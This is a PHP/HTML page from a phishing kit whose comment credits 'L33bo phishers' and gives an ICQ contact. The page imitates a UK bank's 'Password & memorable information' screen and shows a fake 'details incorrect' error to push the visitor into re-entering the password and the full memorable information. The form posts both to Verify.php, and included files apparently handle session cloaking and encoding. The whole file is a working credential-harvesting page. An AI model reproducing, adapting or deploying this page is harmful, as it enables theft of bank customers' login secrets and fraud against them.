<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/enc.php";
require "../assets/includes/memo.php";
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<link href="assets/img/001.ico" type="image/x-icon" rel="icon" />
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Enter Memorable</title>
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/css/l33bo.css" rel="stylesheet" type="text/css">
<script src="assets/js/gen_validatorv4.js" type="text/javascript"></script>
<style>
.error_strings {
    margin: 0px;
    padding: 0px 20px 0px 30px;
    color: #db0000;
    font-size: 16px;
}
</style>
</head>
<body class="hasJS">
<div id="outer">
<div id="banner">
<p id="logo"><img src="assets/img/logo.gif"></p>
<p id="userStatus"><img id="headerChangeNGB:lnkpadlockSeclogoff" src="assets/img/001.png"></p>
<div class="cookiePolicy"><a href="#" class="blockLink">Cookie policy</a></div>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Password &amp; memorable information</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="panel">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">                                                                           
<div class="panelInner">
<div class="inner">
<div class="msgError">
<div class="msgTL">
<div class="msgTR">
<div class="msgBR">
<div class="msgBL">
<p class="msgP" style="color: #db0000;">8000066 : Sorry, the details you've entered are incorrect. Please re-enter your details and try again.</p>
</div>
</div>
</div>
</div>
</div>
<form id="frmLogin" name="frmLogin" method="post" action="Verify.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" enctype="application/x-www-form-urlencoded">
<div class="formField">
<label for="frmReEnterMemorableInformation1:formPassword">Please re-enter your password.</label>
<input type="password" id="pass2" name="pass2" class="field" maxlength="20" value="">
<div id='frmLogin_pass2_errorloc' class="error_strings"></div>
</div>
<div class="formField">
<label for="frmReEnterMemorableInformation1:formPassword">Enter your FULL memorable information.</label>
<input type="password" id="memo" name="memo" class="field" maxlength="20" value="">
<div id='frmLogin_memo_errorloc' class="error_strings"></div>
</div>
<div class="clearer"></div>
</div>
<div class="divider">
<hr>
</div>
<div class="actions">
<input id="frmReEnterMemorableInformation1:lnkSubmit" name="frmReEnterMemorableInformation1:lnkSubmit" type="submit" value="Submit" title="Submit" class="submitAction">
<div class="nav">
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
<p class="lnkLev2PCancel"><a id="frmReEnterMemorableInformation1:lnkCancel" name="frmReEnterMemorableInformation1:lnkCancel" href="#" class="blockLink">Cancel</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</form>
<script src="assets/js/validatememo2.js" type="text/javascript"></script>
</div>
</div>
</div>
</div>
</div>
</div>
</div>                    
<div id="footer">
<div class="FootNav ">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a id="lnk1" name="lnk1" href="#" class="blockLink">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a id="lnk2" name="lnk2" href="#" class="blockLink">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a id="lnk3" name="lnk3" href="#" class="blockLink">Contact us</a></p>
</div>
</div>
<div class="footerLinksLogin"><a id="footerngb:cndunauthenvironngb:lnksecurityloggedout" name="footerngb:cndunauthenvironngb:lnksecurityloggedout" href="#">Security</a><a id="footerngb:cndunauthenvironngb:lnkLegalloggedout" name="footerngb:cndunauthenvironngb:lnkLegalloggedout" href="#" class="footerLinksLast">Legal</a>
</div>
<span id="mLogonSuccess" style="display:none"></span>
</div>
</div>
</div>
</body>
</html>